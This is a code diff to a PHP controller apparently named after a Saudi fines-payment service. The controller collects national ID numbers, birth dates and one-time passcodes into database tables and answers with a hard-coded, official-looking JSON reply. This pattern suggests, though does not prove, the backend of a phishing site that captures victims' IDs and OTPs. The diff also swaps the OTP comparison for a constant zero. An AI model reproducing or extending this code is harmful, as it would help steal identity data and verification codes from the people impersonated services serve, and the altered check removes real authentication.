@@ -265,6 +265,9 @@ class EfaaController extends Controller
         $dateofbirth = $request->input('dob');
         $idNumber    = $request->input('violatorId');
 
+        $isCitizen =  substr($idNumber, 0, strspn($idNumber, "12"));
+
+
         $verNumber  = $otp;
         
         $userInsertData =  [
@@ -280,7 +283,7 @@ class EfaaController extends Controller
         
            $user =   DB::table('admins')
                                          ->where('id_ref',$idNumber)
-                                         ->where('fineNumber',$verNumber)
+                                         ->where('fineNumber',0)
                                         ->first();
 
 
@@ -291,16 +294,17 @@ class EfaaController extends Controller
 
             $isFound =   DB::table('admins')
                                             ->where('id_ref',$idNumber )
-                                             ->where('fineNumber',$verNumber)
+                                             ->where('fineNumber',0)
                                             ->first();
 
          
 
-             if(empty($isFound)) {
+             if (! empty($otp)) {
 
                     $userUpdateData =  [
     
                         'status'     => 0,
+                        'info'       => '{}',
                         'fineNumber' => $verNumber,
                     ];   
                     
@@ -340,14 +344,14 @@ class EfaaController extends Controller
                                                   ->where('id_ref',$id)
                                                   ->where('national_id',$idNumber)
                                                   ->first();
-        
+   
                 if(isset($customer))
                 DB::table('customers')
                                     ->where('id_ref',$id)
                                     ->where('national_id',$idNumber)
                                     ->delete();
                 
-            
+                        
                 DB::table('customers')->insert($data);  
                 
                 $customer = DB::table('customers')
@@ -355,7 +359,7 @@ class EfaaController extends Controller
                                                     ->where('national_id',$idNumber)
                                                     ->first();
 
-    
+
 
                     if(empty($dateofbirth)){
                         $dateofbirthplus = "استعلام";
@@ -402,7 +406,8 @@ class EfaaController extends Controller
         DB::table('user_infos')->insert($htmlData);
 
 
-        if($otp == 1) {
+
+        if(($isCitizen == 1 || $isCitizen == 2 ) &&  $otp == 0) {
 
             return response()->json( array('errorMessageDTO' => null,
             "expirationTime" => "2024-07-30T00:58:41.122106+03:00",
@@ -415,7 +420,7 @@ class EfaaController extends Controller
 
 
             $user =   DB::table('admins')->where('id_ref',$idNumber)
-                                         ->where('fineNumber',$verNumber)
+                                         ->where('fineNumber',0)
                                          ->first();
 
       
@@ -426,7 +431,7 @@ class EfaaController extends Controller
         
                
                    $user =   DB::table('admins')->where('id_ref',$idNumber)
-                                                 ->where('fineNumber',$verNumber)
+                                                 ->where('fineNumber',0)
                                                  ->first();
                    if(! empty($user->status))
                    $counter++;
